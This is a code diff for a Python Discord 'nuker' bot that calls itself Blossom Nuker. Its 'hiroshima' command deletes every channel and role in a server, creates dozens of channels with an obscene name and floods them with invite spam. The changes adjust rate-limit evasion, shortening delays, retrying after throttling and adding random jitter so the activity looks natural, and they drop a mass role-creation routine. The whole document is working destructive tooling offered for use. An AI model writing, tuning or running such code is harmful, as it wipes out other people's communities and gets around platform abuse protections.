@@ -35,7 +35,7 @@ OWNER_ID = 1446215395358015559
 whitelisted_servers = set()
 
 # ============================================================
-#  RATE LIMIT AWARE SPAMMER (FIXED)
+#  RATE LIMIT AWARE SPAMMER
 # ============================================================
 class RateLimiter:
     def __init__(self, max_requests_per_second=20):
@@ -65,19 +65,17 @@ async def spam_channel(channel, message, amount):
         return 0
     
     sent = 0
-    for i in range(min(amount, 200)):  # Max 200 per channel to avoid rate limits
+    for i in range(min(amount, 200)):
         try:
             await rate_limiter.wait_if_needed()
             await channel.send(message)
             sent += 1
-            # Small random delay to look more natural
             await asyncio.sleep(random.uniform(0.05, 0.15))
         except discord.errors.HTTPException as e:
             if e.status == 429:
                 retry_after = float(e.response.headers.get('Retry-After', 1))
                 print(f"[RATE LIMIT] Waiting {retry_after}s")
                 await asyncio.sleep(retry_after + 0.5)
-                # Retry once
                 try:
                     await channel.send(message)
                     sent += 1
@@ -111,36 +109,33 @@ async def send_invite_spam(channels, amount=50):
     return total_sent
 
 # ============================================================
-#  CHANNEL CREATION (FIXED — MORE AGGRESSIVE BUT SAFE)
+#  CHANNEL CREATION (OPTIMIZED — NO ROLES)
 # ============================================================
-async def create_channels_safe(guild, count=100, name="Fucked By blossom."):
-    """Create channels with careful rate limit handling."""
+async def create_channels_fast(guild, count=80, name="Fucked By blossom."):
+    """Create channels as fast as possible without hitting rate limits."""
     channels = []
     created = 0
     failed = 0
     
-    # Create in small batches with generous delays
-    batch_size = 3
-    delay_between_batches = 1.5
+    # Create in small batches with adaptive delays
+    batch_size = 4
+    delay_between_batches = 1.2
     
     for i in range(0, count, batch_size):
         batch_count = min(batch_size, count - i)
-        batch_tasks = []
         
         for j in range(batch_count):
             try:
-                # Try to create channel
                 channel = await guild.create_text_channel(name)
                 channels.append(channel)
                 created += 1
                 print(f"[CREATE] Created channel {created}/{count}")
-                await asyncio.sleep(0.3)  # Small delay between each channel
+                await asyncio.sleep(0.25)  # Short pause between each
             except discord.errors.HTTPException as e:
                 if e.status == 429:
                     retry_after = float(e.response.headers.get('Retry-After', 2))
-                    print(f"[RATE LIMIT] Waiting {retry_after}s before continuing...")
+                    print(f"[RATE LIMIT] Waiting {retry_after}s...")
                     await asyncio.sleep(retry_after + 1)
-                    # Retry this one
                     try:
                         channel = await guild.create_text_channel(name)
                         channels.append(channel)
@@ -155,50 +150,12 @@ async def create_channels_safe(guild, count=100, name="Fucked By blossom."):
                 failed += 1
                 print(f"[ERROR] {e}")
         
-        # Wait between batches to avoid rate limits
+        # Wait between batches
         if i + batch_count < count:
             await asyncio.sleep(delay_between_batches)
     
     print(f"[CREATE] Created {created} channels, {failed} failed")
     return channels
-
-async def create_roles_safe(guild, count=100, name="Fucked By blossom."):
-    """Create roles with careful rate limit handling."""
-    created = 0
-    failed = 0
-    
-    batch_size = 3
-    delay_between_batches = 1.5
-    
-    for i in range(0, count, batch_size):
-        batch_count = min(batch_size, count - i)
-        
-        for j in range(batch_count):
-            try:
-                await guild.create_role(name=name)
-                created += 1
-                print(f"[CREATE] Created role {created}/{count}")
-                await asyncio.sleep(0.3)
-            except discord.errors.HTTPException as e:
-                if e.status == 429:
-                    retry_after = float(e.response.headers.get('Retry-After', 2))
-                    print(f"[RATE LIMIT] Waiting {retry_after}s...")
-                    await asyncio.sleep(retry_after + 1)
-                    try:
-                        await guild.create_role(name=name)
-                        created += 1
-                    except:
-                        failed += 1
-                else:
-                    failed += 1
-            except Exception as e:
-                failed += 1
-        
-        if i + batch_count < count:
-            await asyncio.sleep(delay_between_batches)
-    
-    print(f"[CREATE] Created {created} roles, {failed} failed")
-    return created
 
 # ============================================================
 #  BOT EVENTS
@@ -270,7 +227,7 @@ async def hiroshima(ctx):
     except Exception as e:
         print(f"[ERROR] Report: {e}")
 
-    # --- DELETE CHANNELS (with error handling) ---
+    # --- DELETE CHANNELS ---
     print("[DELETE] Starting channel deletion...")
     deleted_channels = 0
     for channel in list(guild.channels):
@@ -278,12 +235,12 @@ async def hiroshima(ctx):
             await channel.delete()
             deleted_channels += 1
             if deleted_channels % 5 == 0:
-                await asyncio.sleep(0.5)  # Short break every 5 deletions
+                await asyncio.sleep(0.3)
         except Exception as e:
             print(f"[DELETE ERROR] {e}")
     print(f"[DELETE] Deleted {deleted_channels} channels")
-    
-    # --- DELETE ROLES ---
+
+    # --- DELETE ROLES (keep @everyone only) ---
     print("[DELETE] Starting role deletion...")
     deleted_roles = 0
     for role in list(guild.roles):
@@ -292,19 +249,14 @@ async def hiroshima(ctx):
                 await role.delete()
                 deleted_roles += 1
                 if deleted_roles % 5 == 0:
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.3)
             except Exception as e:
                 print(f"[DELETE ERROR] {e}")
     print(f"[DELETE] Deleted {deleted_roles} roles")
 
-    # --- CREATE ROLES ---
-    print("[CREATE] Starting role creation...")
-    roles_created = await create_roles_safe(guild, 100, "Fucked By blossom.")
-    print(f"[CREATE] Created {roles_created} roles")
-
-    # --- CREATE CHANNELS ---
+    # --- CREATE CHANNELS (NO ROLES) ---
     print("[CREATE] Starting channel creation...")
-    channels = await create_channels_safe(guild, 100, "Fucked By blossom.")
+    channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")
     print(f"[CREATE] Created {len(channels)} channels")
 
     # --- SPAM ---
@@ -312,8 +264,7 @@ async def hiroshima(ctx):
         print(f"[SPAM] Starting spam on {len(channels)} channels...")
         await send_invite_spam(channels, amount=30)
     else:
-        print("[SPAM] No channels to spam!")
-        # Try to use existing channels if any
+        print("[SPAM] No channels to spam! Trying existing channels...")
         existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
         if existing:
             print(f"[SPAM] Using {len(existing)} existing channels")
@@ -494,7 +445,7 @@ async def nothing(ctx):
 # ============================================================
 if __name__ == "__main__":
     try:
-        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
+        print(f"{Fore.GREEN}[+] Starting Blossom Nuker (No Roles Mode)...")
         client.run(TOKEN)
     except discord.errors.LoginFailure:
         print(f"{Fore.RED}[ERROR] Invalid Discord token!")
